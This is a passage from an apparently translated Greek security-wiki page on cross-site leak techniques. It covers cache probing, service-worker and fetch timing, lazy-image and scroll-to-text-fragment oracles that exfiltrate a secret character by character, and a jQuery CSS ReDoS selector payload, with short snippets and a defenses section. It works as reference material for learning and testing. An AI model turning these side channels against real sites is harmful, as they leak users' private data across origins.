- **Summary:** Είναι δυνατόν να προσπαθήσετε να φορτώσετε έναν πόρο και πριν φορτωθεί να διακοπεί η φόρτωση. Ανάλογα με το αν προκληθεί σφάλμα, ο πόρος είχε ή δεν είχε αποθηκευτεί στην cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Χρησιμοποιήστε _**fetch**_ και _**setTimeout**_ με έναν **AbortController** για να ανιχνεύσετε αν ο **πόρος είναι αποθηκευμένος στην cache** και για να απομακρύνετε έναν συγκεκριμένο πόρο από την cache του περιηγητή. Επιπλέον, η διαδικασία συμβαίνει χωρίς την αποθήκευση νέου περιεχομένου.

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Είναι δυνατόν να **επικαλύψετε τις ενσωματωμένες συναρτήσεις** και να διαβάσετε τα επιχειρήματά τους, ακόμη και από **διασυνοριακά σενάρια** (τα οποία δεν μπορούν να διαβαστούν άμεσα), αυτό μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστότοπου χρησιμοποιώντας service workers.
- **Code Example**:

Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να καταχωρήσει έναν **service worker** σε μία από τις τοποθεσίες τους, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην στοχευμένη ιστοσελίδα από το κύριο έγγραφο και δίνει εντολή στον **service worker** να ξεκινήσει ένα χρονοδιακόπτη. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγεί την αναφορά που αποκτήθηκε στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **service worker**.

Κατά την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **service worker** απαντά με έναν **204 (No Content)** κωδικό κατάστασης, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **service worker** καταγράφει μια μέτρηση από τον χρονοδιακόπτη που ξεκίνησε νωρίτερα στο βήμα δύο. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

> [!WARNING]
> Σε μια εκτέλεση χρονομέτρησης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν την φορτώσετε.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Χρόνος (γενικά λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Χρόνος (γενικά λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα χρησιμοποιώντας `window.open`. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

## With HTML or Re Injection

Εδώ μπορείτε να βρείτε τεχνικές για την εξαγωγή πληροφοριών από ένα διασυνοριακό HTML **εισάγοντας περιεχόμενο HTML**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για οποιονδήποτε λόγο μπορείτε να **εισάγετε HTML αλλά δεν μπορείτε να εισάγετε κώδικα JS**.

### Dangling Markup

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Αν χρειάζεστε να **εξάγετε περιεχόμενο** και μπορείτε να **προσθέσετε HTML πριν από το μυστικό**, θα πρέπει να ελέγξετε τις **κοινές τεχνικές κρεμασμένου markup**.\
Ωστόσο, αν για οποιονδήποτε λόγο **ΠΡΕΠΕΙ** να το κάνετε **χαρακτήρα προς χαρακτήρα** (ίσως η επικοινωνία είναι μέσω μιας επιτυχίας cache) μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

**Εικόνες** στο HTML έχουν μια ιδιότητα "**loading**" της οποίας η τιμή μπορεί να είναι "**lazy**". Σε αυτή την περίπτωση, η εικόνα θα φορτωθεί όταν την δει κανείς και όχι ενώ η σελίδα φορτώνει:
```html
<img src=/something loading=lazy >
```
Ωστόσο, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς άχρηστους χαρακτήρες** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε τη σελίδα πριν από το μυστικό ή να προσθέσετε κάτι όπως** `<br><canvas height="1850px"></canvas><br>.`\
Έτσι, αν για παράδειγμα η **ένεση μας εμφανιστεί πριν από τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία + τα άχρηστα θα **εμποδίσουν τη φόρτωσή της** (θα χρειαστεί να πειραματιστείτε με το πόσα άχρηστα να τοποθετήσετε). Αυτό συνέβη σε [**αυτή τη γραφή**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι όπως
```
#:~:text=SECR
```
Έτσι, η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τους χαρακτήρες junk του επιτιθέμενου και την εικόνα lazy load και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Καθώς αυτό το κείμενο είναι το μυστικό και είναι ακριβώς **κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μαντέψιμο μυστικό είναι σωστό**. Έτσι, έχετε τον ορατό σας για να **εξάγετε το μυστικό χαρακτήρα προς χαρακτήρα**.

Ένα παράδειγμα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Χρόνος Φόρτωσης Εικόνας Lazy Based

Αν **δεν είναι δυνατό να φορτωθεί μια εξωτερική εικόνα** που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα φορτώθηκε, μια άλλη επιλογή θα ήταν να προσπαθήσετε να **μαντέψετε τον χαρακτήρα πολλές φορές και να το μετρήσετε**. Αν η εικόνα φορτωθεί, όλα τα αιτήματα θα διαρκέσουν περισσότερο από ότι αν η εικόνα δεν φορτωθεί. Αυτό χρησιμοποιήθηκε στην [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που συνοψίζεται εδώ:**

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Αν χρησιμοποιηθεί το `jQuery(location.hash)`, είναι δυνατόν να ανακαλυφθεί μέσω του χρόνου **αν υπάρχει κάποιο HTML περιεχόμενο**, αυτό συμβαίνει γιατί αν ο επιλεγέας `main[id='site-main']` δεν ταιριάζει, δεν χρειάζεται να ελέγξει τους υπόλοιπους **επιλεγείς**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
xs-search/css-injection/
{{#endref}}

## Άμυνες

Υπάρχουν μετριασμοί που προτείνονται στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) καθώς και σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευθείτε από αυτές τις τεχνικές.

## Αναφορές

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}
